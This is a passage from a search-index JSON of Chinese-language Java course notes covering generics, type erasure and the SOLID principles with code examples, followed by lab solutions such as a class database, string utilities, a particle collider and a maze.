<code>var</code>\u3002\u5982\u679c\u4f60\u5728\u53f3\u4fa7\u7684\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u4e2d\u63d0\u4f9b\u4e86\u8db3\u591f\u7684\u4fe1\u606f\u8ba9\u7f16\u8bd1\u5668\u63a8\u65ad\u51fa\u7c7b\u578b\u4f8b\u5982 <code>new RunningMaximum&lt;&gt;(1)</code>\uff0c\u5176\u4e2d <code>1</code> \u662f <code>Integer</code>\uff0c\u5982\u679c\u6784\u9020\u51fd\u6570\u63a5\u53d7 T \u7c7b\u578b\u53c2\u6570\uff0c\u7f16\u8bd1\u5668\u5c31\u80fd\u63a8\u65ad\u51fa T \u662f Integer\uff0c\u4f60\u5c31\u53ef\u4ee5\u7ed3\u5408 <code>var</code> \u548c\u83f1\u5f62\u8fd0\u7b97\u7b26\u5199\u6210\uff1a</p> <pre><code>var runningMax = new RunningMaximum&lt;&gt;(1);\n</code></pre>"},{"location":"cs/java/basics/w9/#generic-methods","title":"Generic Methods","text":"<p>\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u72ec\u7acb\u4e8e\u7c7b\u5b9a\u4e49\u81ea\u5df1\u7684\u7c7b\u578b\u53c2\u6570</p> <p>\u7c7b\u578b\u53c2\u6570\u5217\u8868\u653e\u5728\u4fee\u9970\u7b26\uff08\u5982 <code>public static</code>\uff09\u4e4b\u540e\uff0c\u8fd4\u56de\u7c7b\u578b\u4e4b\u524d\u3002</p> <pre><code>public class GenericMax {\n    // \u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b\u578b\u53c2\u6570 T\uff0c\u5b83\u5fc5\u987b\u5b9e\u73b0 Comparable&lt;T&gt;\n    public static &lt;T extends Comparable&lt;T&gt;&gt; T max(T a, T b) {\n        if (a.compareTo(b) &gt; 0) {\n            return a;\n        } else {\n            return b;\n        }\n    }\n}\n</code></pre> <p><code>T</code> \u7684\u5177\u4f53\u542b\u4e49\u662f\u8ddf\u5bf9\u8c61\u7ed1\u5b9a\u7684\uff0c\u800c\u9759\u6001\u65b9\u6cd5\u5c5e\u4e8e\u7c7b\uff0c\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u7279\u5b9a\u7684\u5bf9\u8c61\u3002\u56e0\u4e3a\u9759\u6001\u65b9\u6cd5\u4e0d\u4e0e\u4efb\u4f55\u7279\u5b9a\u5bf9\u8c61\u5173\u8054\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u77e5\u9053\u5f53\u524d\u4e0a\u4e0b\u6587\u4e2d <code>T</code> \u5e94\u8be5\u4ee3\u8868\u54ea\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u56e0\u6b64\u5f53\u4f60\u9700\u8981\u5728\u9759\u6001\u65b9\u6cd5\u4e2d\u4f7f\u7528\u6cdb\u578b\u65f6\uff0c\u4f60\u4e0d\u80fd\u4f7f\u7528\u7c7b\u5b9a\u4e49\u7684\u7c7b\u578b\u53c2\u6570\uff08\u5982 <code>T</code>\uff09\u3002\u76f8\u53cd\uff0c\u4f60\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u6cdb\u578b\u9759\u6001\u65b9\u6cd5\uff0c\u5b83\u6709\u81ea\u5df1\u72ec\u7acb\u7684\u7c7b\u578b\u53c2\u6570\u3002</p>"},{"location":"cs/java/basics/w9/#type-erasure","title":"Type Erasure","text":"<p>Java \u4e2d\u7684\u6cdb\u578b\u4e3b\u8981\u662f\u7f16\u8bd1\u65f6\u7684\u7279\u6027\u3002\u5728\u7f16\u8bd1\u4ee3\u7801\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u68c0\u67e5\u6cdb\u578b\u7684\u7c7b\u578b\u5b89\u5168\u6027\uff0c\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6240\u6709\u7684\u6cdb\u578b\u7c7b\u578b\u4fe1\u606f\u90fd\u4f1a\u88ab\u64e6\u9664 (erased) \u3002\u7c7b\u578b\u53c2\u6570\uff08\u5982 <code>T</code>\uff09\u5728\u5b57\u8282\u7801\u4e2d\u4f1a\u88ab\u66ff\u6362\u6210\u5b83\u4eec\u7684\u8fb9\u754c\u3002\u7f16\u8bd1\u5668\u4f1a\u5728\u9700\u8981\u7684\u5730\u65b9\u81ea\u52a8\u63d2\u5165\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4ee5\u4fdd\u8bc1\u8fd0\u884c\u65f6\u903b\u8f91\u7684\u6b63\u786e\u6027 \u3002\u7c7b\u578b\u64e6\u9664\u662f Java \u6cdb\u578b\u5b9e\u73b0\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u4f46\u5b83\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u9650\u5236\u548c\u201c\u9677\u9631\u201d (sharp edges)\u3002</p> <ul> <li>\u4e0d\u80fd\u521b\u5efa\u7c7b\u578b\u53c2\u6570\u7684\u5b9e\u4f8b \u5982 <code>new T()</code></li> </ul> <ul> <li>\u4e0d\u80fd\u521b\u5efa\u6cdb\u578b\u6570\u7ec4 (\u5982 <code>new T[100]</code>)</li> </ul> <ul> <li>\u4e0d\u80fd\u5bf9\u5e26\u6709\u53c2\u6570\u5316\u7c7b\u578b\u7684\u5bf9\u8c61\u4f7f\u7528 <code>instanceof</code> \u68c0\u67e5 (\u5982 <code>obj instanceof ArrayList&lt;String&gt;</code>)</li> </ul> <ul> <li> <p>\u64e6\u9664\u540e\u65b9\u6cd5\u7b7e\u540d\u76f8\u540c\u4f1a\u9020\u6210\u6b67\u4e49</p> <p>Method Signature\uff1a\u5728 Java \u4e2d\uff0c\u4e00\u4e2a\u65b9\u6cd5\u7684\u7b7e\u540d\u4e3b\u8981\u7531\u5b83\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\u7c7b\u578b\u5217\u8868\u7ec4\u6210\u3002</p> <pre><code>public class MyGenericClass&lt;T, V&gt; {\n\n    public void process(T data) {\n        System.out.println(\"Processing T: \" + data);\n    }\n\n    public void process(V data) { // \u770b\u8d77\u6765\u548c\u4e0a\u9762\u90a3\u4e2a\u4e0d\u540c\n        System.out.println(\"Processing V: \" + data);\n    }\n}\n</code></pre> <p>\u64e6\u9664\u540e\u90fd\u53d8\u6210\u4e86 <code>process(Objec data)</code> \u7f16\u8bd1\u9636\u6bb5\u5c31\u4f1a\u62a5\u9519</p> </li> </ul>"},{"location":"cs/java/basics/w9/#solid","title":"SOLID","text":"<p>\u201cClean Code\u201d by Robert Martin</p> <p>Robert Martin \u7ed9 OOP \u4ee3\u7801\u89c4\u8303\u63d0\u51fa\u4e86\u539f\u5219\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u8ba9\u4ee3\u7801\u5bb9\u6613\u7406\u89e3\u3001\u7075\u6d3b\u3001\u53ef\u91cd\u7528\u3001\u6613\u4e8e\u7ef4\u62a4\uff0c\u8ba9\u4f60\u611f\u89c9\u50cf\u662f\u4e2a\u201c\u771f\u6b63\u7684\u201d\u5de5\u7a0b\u5e08</p>"},{"location":"cs/java/basics/w9/#single-responsibility-principle-srp","title":"Single Responsibility Principle - SRP","text":"<ul> <li>\u4e00\u4e2a\u7c7b\u5e94\u8be5\u53ea\u6709\u4e00\u4e2a\u5f15\u8d77\u5b83\u53d8\u5316\u7684\u539f\u56e0 \u3002\u8fd9\u610f\u5473\u7740\u4e00\u4e2a\u7c7b\u5e94\u8be5\u53ea\u627f\u62c5\u4e00\u9879\u804c\u8d23\uff0c\u6216\u8005\u8bf4\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5 \u3002 \u8fd9\u4f7f\u5f97\u4ee3\u7801\u66f4\u5bb9\u6613\u6d4b\u8bd5\u548c\u7ef4\u62a4 \u3002\u5982\u679c\u4e00\u4e2a\u7c7b\u53ea\u505a\u4e00\u4ef6\u4e8b\uff0c\u90a3\u4e48\u601d\u8003\u5982\u4f55\u4f7f\u7528\u548c\u6d4b\u8bd5\u5b83\u4f1a\u66f4\u5bb9\u6613 \u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u5c06\u6587\u4ef6\u8bfb\u53d6\u3001\u5199\u5165\u548c\u538b\u7f29\u7684\u529f\u80fd\u5206\u6563\u5230<code>FileReader</code>\u3001<code>FileWriter</code>\u548c<code>FileCompressor</code>\u4e09\u4e2a\u4e0d\u540c\u7684\u7c7b\u4e2d\uff0c\u800c\u4e0d\u662f\u653e\u5728\u4e00\u4e2a<code>FileManager</code>\u7c7b\u91cc\uff0c\u5c31\u662f\u9075\u5faaSRP\u7684\u4f8b\u5b50 \u3002\u540c\u6837\uff0c\u5c06\u8ff7\u5bab\u6570\u636e\u7684\u7ba1\u7406\uff08<code>Grid</code>\u7c7b\uff09\u548c\u8def\u5f84\u67e5\u627e\uff08<code>MazeSolver</code>\u7c7b\uff09\u5206\u5f00\u4e5f\u662fSRP\u7684\u5e94\u7528 \u3002</p>"},{"location":"cs/java/basics/w9/#open-closed-principle-ocp","title":"Open-Closed Principle - OCP","text":"<p>\u8f6f\u4ef6\u5b9e\u4f53\uff08\u5982\u7c7b\u3001\u6a21\u5757\u3001\u51fd\u6570\u7b49\uff09\u5e94\u8be5\u5bf9\u6269\u5c55\u5f00\u653e\uff0c\u5bf9\u4fee\u6539\u5173\u95ed \u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5e94\u8be5\u80fd\u591f\u901a\u8fc7\u6dfb\u52a0\u65b0\u4ee3\u7801\uff08\u5982\u65b0\u7c7b\u6216\u65b0\u65b9\u6cd5\uff09\u6765\u589e\u52a0\u65b0\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u4fee\u6539\u73b0\u6709\u4ee3\u7801 \u3002</p> <ul> <li>\u56e0\u6b64\u9f13\u52b1\u4f7f\u7528\u63a5\u53e3\u548c\u62bd\u8c61\u7c7b\uff0c\u964d\u4f4e\u5728\u6dfb\u52a0\u65b0\u529f\u80fd\u65f6\u5f15\u5165\u9519\u8bef\u7684\u98ce\u9669 \u3002</li> </ul> <p>\u901a\u8fc7\u8ba1\u7b97\u56fe\u5f62\u9762\u79ef\u7684\u4f8b\u5b50\u8bf4\u660e\uff0c\u4f7f\u7528 <code>Shape</code> \u63a5\u53e3\uff0c\u5e76\u8ba9 <code>Circle</code> \u548c <code>Square</code> \u7c7b\u5b9e\u73b0\u8be5\u63a5\u53e3\u6765\u8ba1\u7b97\u5404\u81ea\u7684\u9762\u79ef\uff0c\u6bd4\u5728\u4e00\u4e2a <code>AreaCalculator</code> \u7c7b\u4e2d\u4f7f\u7528 <code>if-else</code> \u5224\u65ad\u5f62\u72b6\u7c7b\u578b\u6765\u8ba1\u7b97\u9762\u79ef\u8981\u597d \u3002\u6dfb\u52a0\u65b0\u5f62\u72b6\uff08\u5982\u4e09\u89d2\u5f62\uff09\u65f6\uff0c\u53ea\u9700\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u73b0 <code>Shape</code> \u63a5\u53e3\u7684\u7c7b\uff0c\u800c\u65e0\u9700\u4fee\u6539\u73b0\u6709\u4ee3\u7801 \u3002   </p> <pre><code>public enum ShapeType {\n    CIRCLE, SQUARE\n}\n\npublic class Shape {\n    public ShapeType type;\n    public double radius; // for Circle\n    public double side; // for Square\n}\n\npublic class AreaCalculator {\n    public double area(Shape shape) {\n        if (shape.type == ShapeType.CIRCLE) {\n            return Math.PI * shape.radius * shape.radius;\n        } else if (shape.type == ShapeType.SQUARE) {\n            return shape.side * shape.side;\n        }\n        return 0;\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6837\u7684\u7a0b\u5e8f\u4e00\u65e6\u51fa\u73b0\u65b0\u7684 Shape \u5c31\u4e0d\u5f97\u4e0d\u4fee\u6539 <code>AreaCalculator</code> \u7c7b</p> <pre><code>public interface Shape {\n    double area();\n}\n\nclass Circle implements Shape {\n    private double radius;\n\n    public double area() {\n        return Math.PI * radius * radius;\n    }\n}\n\nclass Square implements Shape {\n    private double side;\n\n    public double area() {\n        return side * side;\n    }\n}\n</code></pre> <p>\u6211\u4eec\u5e94\u8be5\u505a\u7684\u662f\u5229\u7528\u63a5\u53e3\u5236\u5b9a\u51c6\u5219\uff0c\u8fd9\u4e00\u5757\u662f <code>open</code> \u7684\uff0c\u4f46 <code>implements</code> \u662f <code>close</code> \u7684</p>"},{"location":"cs/java/basics/w9/#liskov-substitution-principle-lsp","title":"Liskov Substitution Principle - LSP","text":"<p>\u91cc\u6c0f\u66ff\u6362\u539f\u5219\uff1a\u4e00\u4e2a\u5b50\u7c7b\u5e94\u8be5\u80fd\u88c5\u4f5c\u81ea\u5df1\u662f\u5b83\u7684\u7236\u7c7b\uff0c\u800c\u4e0d\u4f1a\u5f04\u574f\u4ec0\u4e48\u4e1c\u897f\u3002</p> <ul> <li>\u8fd9\u9f13\u52b1\u4e86\u6b63\u786e\u7684\u7ee7\u627f\u548c\u591a\u6001\u6027\u3002</li> </ul> <ul> <li>\u786e\u4fdd\u65b0\u7684\u6d3e\u751f\u7c7b\u4e0d\u4f1a\u5e26\u6765\u610f\u5916\u7684\u884c\u4e3a\u3002</li> </ul> <pre><code>class Bird {\n    void fly() {\n    }\n}\n\nclass Penguin extends Bird {\n    @Override\n    void fly() {\n        throw new UnsupportedOperationException(\"Penguins can't fly\");\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6837\u7684\u7a0b\u5e8f\u8fdd\u53cd\u4e86 <code>LSP</code>\u56e0\u4e3a\u76f4\u63a5\u4fee\u6539\u4e86 <code>fly</code> \u7684\u65b9\u6cd5\uff0c\u8fd9\u6837\u5982\u679c\u8ba9\u4f01\u9e45\u66ff\u4ee3\u9e1f\u7c7b\u4f7f\u7528\u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u4f01\u9e45\u4e0d\u4f1a\u98de</p> <pre><code>abstract class Bird {\n    abstract void move();\n}\n\nclass FlyingBird extends Bird {\n    @Override\n    void move() {\n        fly();\n    }\n\n    void fly() { ... }\n}\n\nclass NonFlyingBird extends Bird {\n    @Override\n    void move() {\n        walk();\n    }\n\n    void walk() { ... }\n}\n</code></pre> <p>\u56e0\u6b64\u6211\u4eec\u4f7f\u7528\u66f4\u62bd\u8c61\u601d\u60f3\u6d3e\u751f\u51fa\u4f1a\u98de\u4e0e\u4e0d\u4f1a\u98de\u4e24\u4e2a\u62bd\u8c61\u7c7b\u578b</p> <p>\u4ee5\u53ca\u7528 <code>function</code> \u4e92\u76f8\u8c03\u7528\u7684\u65b9\u5f0f\u6700\u5c0f\u5316\u5f71\u54cd</p> <p>\u4f60\u89c9\u5f97\u7535\u52a8\u4eba\u9020\u9e2d\u770b\u8d77\u6765\u50cf\u9e2d\u5b50\u62bd\u8c61\u4e3a\u9e2d\uff0c\u4f46\u662f\u524d\u8005\u9700\u8981\u7535\u6c60\uff0c\u90a3\u5c31\u662f\u9519\u8bef\u62bd\u8c61</p>"},{"location":"cs/java/basics/w9/#interface-segregation-principle-isp","title":"Interface Segregation Principle - ISP","text":"<p>\u63a5\u53e3\u9694\u79bb\u539f\u5219</p> <ul> <li>\u5ba2\u6237\u7aef\u4e0d\u5e94\u8be5\u88ab\u5f3a\u8feb\u4f9d\u8d56\u5b83\u4eec\u4e0d\u4f7f\u7528\u7684\u65b9\u6cd5 \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u591a\u4e2a\u4e13\u95e8\u7684\u5c0f\u63a5\u53e3\u901a\u5e38\u6bd4\u4f7f\u7528\u4e00\u4e2a\u5e9e\u5927\u81c3\u80bf\u7684\u63a5\u53e3\u8981\u597d\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u7ef4\u62a4\u6027\u548c\u53ef\u8bfb\u6027 </li> </ul> <pre><code>public class GameEntity {\n    public Model3D getModel() { ... }\n\n    public Point3D getPosition() { ... }\n\n    public int getHP() { ... }\n\n    public int getAttack() { ... }\n}\n\nclass Renderer {\n    public void render(GameEntity entity) {\n        // We don't care about getHP() and getAttack()\n    }\n}\n</code></pre> <p>\u6bd4\u5982\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u6e38\u620f\u5f00\u53d1\u5546\u7ee7\u627f\u6e38\u620f\u5b9e\u4f53\u540e\u9700\u8981\u5f00\u53d1\u4e00\u4e2a\u6e32\u67d3\u7c7b\uff0c\u8fd9\u4e2a\u6e32\u67d3\u7c7b\u4e0d\u9700\u8981\u8840\u91cf\u548c\u653b\u51fb\u529b\u53c2\u6570\uff0c\u5c31\u9020\u6210\u4e86\u5185\u5b58\u6d6a\u8d39\uff0c\u6240\u4ee5\u4ece\u8bbe\u8ba1\u4e4b\u521d\u5c31\u8981\u8003\u8651\u5230\u4f7f\u7528\u7684\u5c0f\u62bd\u8c61\u63a5\u53e3\uff1a</p> <pre><code>interface Renderable {\n    Model3D getModel();\n\n    Point3D getPosition();\n}\n\ninterface Fighter {\n    int getHP();\n\n    int getAttack();\n}\n\npublic class GameEntity implements Renderable, Fighter {\n    public Model3D getModel() { ... }\n\n    public Point3D getPosition() { ... }\n\n    public int getHP() { ... }\n\n    public int getAttack() { ... }\n}\n\nclass Renderer {\n    public void render(Renderable entity) {\n        // Much better\n    }\n}\n</code></pre> <p>\u7528\u63a5\u53e3\u5b9e\u73b0\u53ef\u6e32\u67d3\u3001\u6709\u6218\u58eb\u8fd9\u4e24\u4e2a\u51c6\u5219</p> <p>\u8fd9\u6837 <code>Renderer</code> \u7c7b\u5c31\u53ef\u4ee5\u53ea\u4f9d\u8d56\u4e8e <code>Renderable</code> \u63a5\u53e3</p>"},{"location":"cs/java/basics/w9/#dependency-inversion-principle-dip","title":"Dependency Inversion Principle - DIP","text":"<p>\u4f9d\u8d56\u5012\u7f6e\u539f\u5219</p> <ul> <li>\u9ad8\u5c42\u6a21\u5757\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u4f4e\u5c42\u6a21\u5757\uff0c\u4e24\u8005\u90fd\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61 \u3002\u62bd\u8c61\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u7ec6\u8282\uff0c\u7ec6\u8282\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61 \u3002\u7b80\u5355\u6765\u8bf4\uff0c\u8981\u9762\u5411\u63a5\u53e3\u7f16\u7a0b\uff0c\u800c\u4e0d\u662f\u9762\u5411\u5b9e\u73b0\u7f16\u7a0b \u3002</li> </ul> <p>\u8fd9\u6837\u4f7f\u4ee3\u7801\u66f4\u52a0\u7075\u6d3b\u3002\u5982\u679c\u6539\u53d8\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u7684\u5b9e\u73b0\uff0c\u4e0d\u9700\u8981\u68c0\u67e5\u6240\u6709\u4f9d\u8d56\u5b83\u7684\u7c7b \u3002</p> <pre><code>class EmailService {\n    void sendEmail(String message, String recipient) { ... }\n}\n\nclass Notification {\n    EmailService emailService;\n\n    void sendNotification(String message, String recipient) {\n        emailService.sendEmail(message, recipient);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>Notification</code> \u76f4\u63a5\u4f9d\u8d56\u4e8e <code>EmailService</code> \u800c\u4e0d\u662f\u63a5\u53e3\uff0c\u6b63\u786e\u5b9e\u73b0\u5e94\u8be5\u662f</p> <pre><code>interface MessageService {\n    void sendMessage(String message, String recipient);\n}\n\nclass EmailService implements MessageService {\n    @Override\n    public void sendMessage(String message, String recipient) {\n        // Not real code\n    }\n}\n\npublic class Notification {\n    MessageService messageService;\n\n    void sendNotification(String message, String recipient) {\n        // Now we can change the message service whenever we want\n        // Depending on an interface is better than depending on a class\n        messageService.sendMessage(message, recipient);\n    }\n}\n</code></pre> <p>\u5c06\u6765\u5982\u679c\u9700\u8981\u77ed\u4fe1\u901a\u77e5\u670d\u52a1\u518d\u5b9e\u73b0\u4e00\u4e2a <code>MessageService</code> \u5c31\u884c\uff0c\u5176\u4ed6\u7c7b\u4e0d\u9700\u8981\u88ab\u66f4\u6539</p>"},{"location":"cs/java/basics/w9/#labs","title":"Labs","text":"<ul> <li> <ol> <li><code>ArrayList</code> \u6570\u636e\u5e93\u8ddf\u8e2a\u6bcf\u95e8\u8bfe\u7a0b\u4e2d\u7684\u5b66\u751f\u6570\u91cf</li> </ol> </li> </ul> <pre><code>import java.util.ArrayList;\n\nclass StudentCourse {\n    String studentName;\n    String courseName;\n\n    public StudentCourse(String student, String course) {\n        this.studentName = student;\n        this.courseName = course;\n    }\n\n    public String getStudentName() {\n        return studentName;\n    }\n\n    public String getCourseName() {\n        return courseName;\n    }\n}\n\npublic class ClassDatabase {\n\n    private ArrayList&lt;StudentCourse&gt; enrollments;\n\n    public ClassDatabase() {\n        this.enrollments = new ArrayList&lt;&gt;();\n    }\n\n    public void addCourseStudent(String student, String course) {\n        StudentCourse newEntry = new StudentCourse(student, course);\n        this.enrollments.add(newEntry);\n    }\n\n    public int countStudents(String course) {\n        int count = 0;\n        for (StudentCourse entry : this.enrollments) {\n            if (entry.getCourseName().equals(course)) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    public static void main(String[] args) {\n        ClassDatabase db = new ClassDatabase();\n        db.addCourseStudent(\"Alan Turing\", \"CITS2005\");\n        db.addCourseStudent(\"Alan Turing\", \"CITS2200\");\n        db.addCourseStudent(\"Max\", \"CITS9999\");\n        db.addCourseStudent(\"Gozz\", \"CITS9999\");\n        db.addCourseStudent(\"Jane Doe\", \"CITS2005\");\n\n        System.out.println(db.countStudents(\"CITS2005\"));\n        System.out.println(db.countStudents(\"CITS2200\"));\n        System.out.println(db.countStudents(\"CITS9999\"));\n        System.out.println(db.countStudents(\"CITS1001\"));\n    }\n}\n</code></pre> <ul> <li> <ol> <li><code>StringAPI</code></li> </ol> </li> </ul> <pre><code>public class WordTools {\n\n    public static boolean isWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isLetter(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isLowerCaseWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isLowerCase(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isUpperCaseWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isUpperCase(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isSarcasmCaseWord(String input) {\n        if (!isWord(input)) {\n            return false;\n        }\n        if (input.length() &lt;= 1) {\n            return true;\n        }\n        for (int i = 1; i &lt; input.length(); i++) {\n            char previousChar = input.charAt(i - 1);\n            char currentChar = input.charAt(i);\n            boolean isPreviousUpper = Character.isUpperCase(previousChar);\n            boolean isCurrentUpper = Character.isUpperCase(currentChar);\n            if (isPreviousUpper == isCurrentUpper) {\n                return false;\n            }\n        }\n        return true;\n    }\n</code></pre> <ul> <li> <ol> <li>Overload <code>MyString</code> \u65b9\u6cd5</li> </ol> </li> </ul> <pre><code>public class MyString {\n    private char[] chars;\n\n    public MyString(char[] chars) {\n        this.chars = new char[chars.length];\n        for (int i = 0; i &lt; chars.length; i++) {\n            this.chars[i] = chars[i];\n        }\n    }\n\n    public char charAt(int index) {\n        return chars[index];\n    }\n\n    public int length() {\n        return chars.length;\n    }\n\n    public boolean equals(MyString s) {\n        if (length() != s.length())\n            return false;\n        for (int i = 0; i &lt; length(); i++) {\n            if (charAt(i) != s.charAt(i))\n                return false;\n        }\n        return true;\n    }\n\n    public MyString substring(int start, int end) {\n        char[] newChars = new char[end - start];\n        for (int i = start; i &lt; end; i++) {\n            newChars[i - start] = chars[i];\n        }\n        return new MyString(newChars);\n    }\n\n    public MyString concatenate(MyString s) {\n        char[] newChars = new char[chars.length + s.length()];\n        for (int i = 0; i &lt; chars.length; i++)\n            newChars[i] = chars[i];\n        for (int i = 0; i &lt; s.length(); i++)\n            newChars[chars.length + i] = s.charAt(i);\n        return new MyString(newChars);\n    }\n}\n</code></pre> <ul> <li><code>\u201cboolean equals\uff08String s\uff09\u201d</code>\uff0c\u9002\u7528\u4e8e\u666e\u901a\u7684 Java \u5b57\u7b26\u4e32</li> <li><code>\u201cMyString substring\uff08int start\uff09\u201d</code>\uff0c\u8fd4\u56de\u4ece \u201cstart\u201d \u5230\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u5b50\u5b57\u7b26\u4e32\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u73b0\u6709\u7684 substring \u65b9\u6cd5\u6765\u7f16\u5199\u66f4\u77ed\u7684\u4ee3\u7801\u5417\uff1f</li> <li><code>\u201cMyString concatenate\uff08char c\uff09\u201d\uff0c</code>\u8fde\u63a5\u5355\u4e2a\u5b57\u7b26</li> </ul> <pre><code>public boolean equals(String s) {\n    if (s == null) { \n        return false;\n    }\n    if (this.length() != s.length()) { \n        return false;\n    }\n    for (int i = 0; i &lt; this.length(); i++) {\n        if (this.charAt(i) != s.charAt(i)) {\n            return false;\n        }\n    }\n    return true;\n}\n\npublic MyString substring(int start) {\n    if (start &lt; 0 || start &gt; this.length()) {\n       throw new StringIndexOutOfBoundsException(\"Invalid starting index: \" + start + \" (The string length is: \" + this.length() + \")\");\n    }\n    // \u8c03\u7528\u73b0\u6709\u7684 substring \u65b9\u6cd5\uff0c\u7ed3\u675f\u7d22\u5f15\u662f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\n    return this.substring(start, this.length());\n}\n\npublic MyString concatenate(char c) {\n    char[] charAsArray = { c };\n    MyString charAsMyString = new MyString(charAsArray);\n    return this.concatenate(charAsMyString);\n}\n</code></pre> <ul> <li> <ol> <li><code>ParticleCollider</code></li> </ol> </li> </ul> <pre><code>import java.util.Arrays;\n\nabstract class Particle {\n    public abstract Particle collide(Particle other);\n\n    @Override\n    public String toString() {\n        return this.getClass().getSimpleName();\n    }\n}\n\nabstract class Xapper extends Particle {\n}\n\nabstract class Zipper extends Particle {\n}\n\nclass ParticleA extends Xapper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Xapper) {\n            return new ParticleA();\n        } else {\n            return new ParticleB();\n        }\n    }\n}\n\nclass ParticleB extends Xapper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Zipper) {\n            return new ParticleC();\n        } else {\n            return new ParticleA();\n        }\n    }\n}\n\nclass ParticleC extends Zipper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof ParticleA) {\n            return new ParticleC();\n        } else {\n            return new ParticleD();\n        }\n    }\n}\n\nclass ParticleD extends Zipper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Zipper) {\n            return new ParticleC();\n        } else {\n            return new ParticleA();\n        }\n    }\n}\n</code></pre> <ul> <li> <ol> <li><code>Maze</code></li> </ol> </li> </ul> <pre><code>YourProjectFolder/\n\u251c\u2500\u2500 MazeSolver.java\n\u2514\u2500\u2500 maze/\n    \u251c\u2500\u2500 Maze.java\n    \u251c\u2500\u2500 MazeBoundsException.java\n    \u2514\u2500\u2500 RandomMaze.java\n</code></pre> <p>\u8d70\u8ff7\u5bab, <code>#</code> \u4ee3\u8868\u5899, <code>x</code> \u4ee3\u8868\u8d70\u8fc7\u8def\u5f84</p> <pre><code> ######\n  #   #\n# # # #\n# # # #\n# # # #\n#   # #\n#####  \n</code></pre> <pre><code>x######\nxx#xxx#\n#x#x#x#\n#x#x#x#\n#x#x#x#\n#xxx#x#\n#####xx\n</code></pre> <p><code>maze/Maze.java</code> </p> <pre><code>package maze;\n\n/**\n * \u8868\u793a\u4e00\u4e2a 2D \u7f51\u683c\u8ff7\u5bab\u3002\n */\npublic class Maze {\n    /** \u7f51\u683c\u5b58\u50a8 (true = \u5899, false = \u7a7a) */\n    private boolean[][] grid;\n    /** \u884c\u6570 */\n    private int numRows;\n    /** \u5217\u6570 */\n    private int numCols;\n\n    /**\n     * \u6784\u9020\u51fd\u6570\u3002\n     * @param rows \u884c\u6570 (&gt;0)\u3002\n     * @param cols \u5217\u6570 (&gt;0)\u3002\n     * @throws IllegalArgumentException \u5982\u679c\u7ef4\u5ea6\u65e0\u6548\u3002\n     */\n    public Maze(int rows, int cols) {\n        if (rows &lt;= 0 || cols &lt;= 0) {\n            throw new IllegalArgumentException(\"\u8ff7\u5bab\u7ef4\u5ea6\u5fc5\u987b\u4e3a\u6b63\u6570\u3002 Rows: \" + rows + \", Cols: \" + cols);\n        }\n        this.numRows = rows;\n        this.numCols = cols;\n        this.grid = new boolean[rows][cols]; // \u9ed8\u8ba4 false (\u7a7a)\n    }\n\n    /**\n     * \u5728 (row, col) \u5904\u8bbe\u7f6e\u5899\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u8d85\u51fa\u8fb9\u754c\u3002\n     */\n    public void setWall(int row, int col) throws MazeBoundsException {\n        checkBounds(row, col);\n        this.grid[row][col] = true; // true \u4ee3\u8868\u5899\n    }\n\n    /**\n     * \u68c0\u67e5 (row, col) \u5904\u662f\u5426\u6709\u5899\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @return \u5982\u679c\u662f\u5899\u5219\u8fd4\u56de true\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u8d85\u51fa\u8fb9\u754c\u3002\n     */\n    public boolean isWall(int row, int col) throws MazeBoundsException {\n        checkBounds(row, col);\n        return this.grid[row][col];\n    }\n\n    /**\n     * 